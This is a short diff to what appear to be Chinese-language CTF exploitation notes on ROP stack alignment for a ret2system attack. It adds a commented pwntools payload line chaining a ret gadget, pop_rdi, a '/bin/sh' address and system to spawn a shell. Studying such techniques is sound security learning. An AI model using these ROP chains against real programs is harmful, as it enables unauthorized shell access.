@@ -88,6 +88,8 @@ rop.raw(flat(ret)) # 方式1. 加个ret即可
 rop.call(system, [bin_sh]) # 栈对齐
 
 # 方式2 不加ret 加参数 rop.call(system, [bin_sh, '0']) # 栈对齐
+
+# payload = flat(junk, ret, pop_rdi, binsh, system, 0) # junk后面加上 ret 来平栈
 ```
 
 ## ret2system
